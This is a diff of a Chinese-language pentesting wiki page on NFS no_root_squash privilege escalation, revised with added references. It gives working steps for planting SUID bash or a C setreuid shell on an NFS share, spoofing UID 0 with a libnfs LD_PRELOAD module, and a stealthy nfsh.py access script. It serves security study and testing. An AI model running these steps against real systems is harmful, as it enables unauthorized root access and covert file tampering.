@@ -1,31 +1,28 @@
-# NFS No Root Squash Misconfiguration Privilege Escalation
-
-{{#include ../../banners/hacktricks-training.md}}
+# NFS No Root Squash 配置错误导致的权限提升
 
 ## Squashing 基本信息
 
-NFS 通常会（特别是在 Linux 中）信任客户端用于访问文件时所指示的 `uid` 和 `gid`（如果未使用 Kerberos）。不过，服务器上可以配置一些选项来**改变此行为**：
+使用 NFS AUTH_SYS/AUTH_UNIX 时，server 会根据每个 RPC 请求中提供的 `uid` 和 `gid` 来执行文件权限检查。其他 security flavor（例如 Kerberos）使用不同的凭据，并且 server 可以在检查权限前映射 numeric credentials。<sup>[[4]](#references)[[5]](#references)</sup>
 
-- **`all_squash`**：它会将所有访问进行 squash，把每个用户和组都映射为 **`nobody`**（无符号数 65534 / 有符号数 -2）。因此，所有人都是 `nobody`，不会使用任何用户身份。
-- **`root_squash`/`no_all_squash`**：这是 Linux 上的默认配置，**只会对 uid 0（root）进行 squash**。因此，任何 `UID` 和 `GID` 都会被信任，但 `0` 会被 squash 为 `nobody`（因此无法进行 root impersonation）。
-- **``no_root_squash`**：启用此配置后，甚至不会对 root 用户进行 squash。这意味着，如果你挂载了使用此配置的目录，就可以以 root 身份访问它。
+- **`all_squash`**：将所有 UID 和 GID 映射到 anonymous account，在 Linux 上默认为 `nobody`（65534）。对于非 root 请求，默认使用 `no_all_squash`。<sup>[[4]](#references)</sup>
+- **`root_squash`**：这是 Linux 上的默认设置，会将 UID/GID 为 0（root）的请求映射到 anonymous account；其他 UID 和 GID 不会被 squash。<sup>[[4]](#references)</sup>
+- **`no_root_squash`**：禁用 root squashing，因此 UID/GID 为 0 的请求可以在 server 上按 root 身份进行评估。<sup>[[4]](#references)</sup>
 
-在 **/etc/exports** 文件中，如果发现某个目录配置为 **no_root_squash**，那么你就可以从**客户端**访问该目录，并且像目标机器上的本地 **root** 一样在该目录中**写入**内容。
+如果允许的 client 可以挂载 **`/etc/exports`** 中配置了 **`no_root_squash`** 的可写 export，那么其 UID/GID 0 请求就可以作为 server 的 root user 在其中写入文件。<sup>[[4]](#references)</sup>
 
-有关 **NFS** 的更多信息，请查看：
+如需了解更多关于 **NFS** 的信息，请查看：
 
 {{#ref}}
 ../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
-## Privilege Escalation
+## 权限提升
 
-### Remote Exploit
+### 远程利用
 
-使用 bash 的选项 1：
-- 在客户端机器上**挂载该目录**，然后**以 root 身份复制** **/bin/bash** 二进制文件到已挂载的目录中，并为其设置 **SUID** 权限，最后在**受害者**机器上执行该 bash 二进制文件。
-- 注意，要在 NFS share 中成为 root，服务器上必须配置 **`no_root_squash`**。
-- 不过，如果未启用该配置，你仍然可以通过将二进制文件复制到 NFS share，并以你想要提升到的用户身份为其设置 SUID 权限，从而提升为其他用户。
+使用 bash 的 Option 1：
+- 在允许的 client 上以 root 身份挂载可写 export，将 **`/bin/bash`** 复制到其中，设置其 **SUID** bit，然后从未使用 `nosuid` 的 victim mount 中执行它。<sup>[[2]](#references)[[4]](#references)</sup>
+- 要使上传的文件保持由 root 所有，server 必须使用 **`no_root_squash`**。如果 root 被 squash，则只有当 client 能够使用该 account 的 numeric UID/GID 合法创建或拥有该文件时，才可能创建属于其他 account 的 SUID binary。<sup>[[4]](#references)</sup>
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,9 +35,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Option 2：使用 C 编译的代码：
-- **在客户端机器上挂载该目录**，然后以 **root 身份将我们编译的 payload 复制**到挂载文件夹中。该 payload 会滥用 SUID 权限，为其赋予 **SUID** 权限，并在 **victim** 机器上执行该 binary（你可以在此处找到一些 [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)）。
-- 与之前相同的限制
+使用编译后的 C code 的 Option 2：
+- 从允许的 client 挂载目录，复制一个滥用 SUID permissions 的已编译 payload，设置其 **SUID** bit，然后从 victim 执行（参见一些 [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)）。
+- 与之前相同的 restrictions
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -54,21 +51,20 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-### Local Exploit
+### 本地 Exploit
 
 > [!TIP]
-> 注意，如果你可以**从自己的机器到受害机器创建 tunnel，则仍然可以使用 Remote version，通过 tunnelling 所需的端口来利用此 privilege escalation**。\
-> 以下 trick 适用于 `/etc/exports` **指示了一个 IP** 的情况。在这种情况下，无论如何你**都无法使用** **remote exploit**，因此需要**滥用此 trick**。\
-> 要使 exploit 正常工作，另一个必要条件是，**`/etc/export` 中的 export** **必须使用 `insecure` flag**。\
-> --_我不确定如果 `/etc/export` 指示了一个 IP address，此 trick 是否有效_--
+> 请注意，如果你可以**从自己的机器到受害机器建立 tunnel，仍然可以使用 Remote 版本，通过 tunnelling 所需端口来利用此 privilege escalation**。\
+> 当 `/etc/exports` 将 export 限制为受害者的 IP 时，下面的技巧非常有用：Remote client 无法挂载它，但本地技术可以通过已挂载在允许主机上的 share 进行操作。<sup>[[2]](#references)</sup>\
+> 对于这种 unprivileged libnfs 方法，**`/etc/exports`** 中的 export 必须使用 `insecure` 标志，以便进程可以使用非 reserved source port；`secure` 是默认设置，不过能够绑定 reserved port 的进程不需要此选项。<sup>[[1]](#references)[[4]](#references)</sup>
 
-### Basic Information
+### 基本信息
 
-该场景涉及利用本地机器上已挂载的 NFS share，借助 NFSv3 specification 中的一个 flaw：该 specification 允许 client 指定其 uid/gid，从而可能实现 unauthorized access。该 exploitation 使用 [libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造 NFS RPC calls 的 library。<sup>[[1]](#references)</sup>
+NFSv3 AUTH_UNIX client 会在每次调用中包含其 effective UID、GID 和 groups，server 会使用这些信息进行权限检查。此本地技术通过 [libnfs](https://github.com/sahlberg/libnfs) 伪造 RPC credentials，从而滥用这一模型；其 preload module 支持在 NFS context 中覆盖 UID/GID。<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
-#### Compiling the Library
+#### 编译 Library
 
-library 的 compilation steps 可能需要根据 kernel version 进行调整。在此特定情况下，fallocate syscalls 被注释掉了。compilation process 包含以下 commands：
+libnfs 示例可能需要针对目标 kernel 进行调整；这里使用的 walkthrough 特别指出，在编译 preload module 之前，需要注释掉 fallocate syscalls。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 ./bootstrap
 ./configure
@@ -77,29 +73,29 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 #### 执行 Exploit
 
-该 exploit 包含创建一个简单的 C 程序（`pwn.c`），用于将权限提升至 root，然后执行 shell。程序会被编译，随后使用 `ld_nfs.so` 在 RPC 调用中伪造 uid，并将生成的二进制文件（`a.out`）以 suid root 权限放置到 share 上：
+该示例创建一个用于启动 shell 的小型 C helper，然后将其放置到 share 上，并在 NFS context 中使用 UID 0 运行 `ld_nfs.so`，使其成为 SUID-root。<sup>[[1]](#references)[[2]](#references)</sup>
 
-1. **编译 exploit 代码：**
+1. **编译 exploit code：**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **将 exploit 放到 share 上，并通过伪造 uid 修改其权限：**
+2. **将 exploit 放到共享目录中，并通过伪造 UID 修改其权限**。<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **执行 exploit 以获得 root 权限：**
+3. **执行 exploit 以获取 root 权限**。<sup>[[2]](#references)</sup>
 ```bash
 /mnt/share/a.out
 #root
 ```
-### Bonus: 用于隐蔽文件访问的 NFShell
+### Bonus: NFShell for Stealthy File Access
 
-获取 root access 后，为了在不更改文件所有权的情况下与 NFS share 交互（避免留下痕迹），会使用 Python script（nfsh.py）。该 script 会调整 uid，使其与被访问文件的 uid 匹配，从而可以在不遇到 permission issues 的情况下与 share 上的文件交互：<sup>[[1]](#references)</sup>
+获取 root access 后，此 `nfsh.py` 模式会在运行 command 前将 effective UID 设置为目标文件的 UID，从而无需递归更改 ownership 即可访问文件。<sup>[[2]](#references)</sup>
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -123,8 +119,11 @@ os.system(' '.join(sys.argv[1:]))
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## 参考资料
+## References
 
-- [1] [一个鲜为人知的 NFS privesc 故事](https://www.errno.fr/nfs_privesc.html)
-
+- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
+- [2] [一个鲜为人知的 NFS privesc 故事](https://www.errno.fr/nfs_privesc.html)
+- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
+- [4] [exports(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [5] [RFC 1813：NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
 {{#include ../../banners/hacktricks-training.md}}
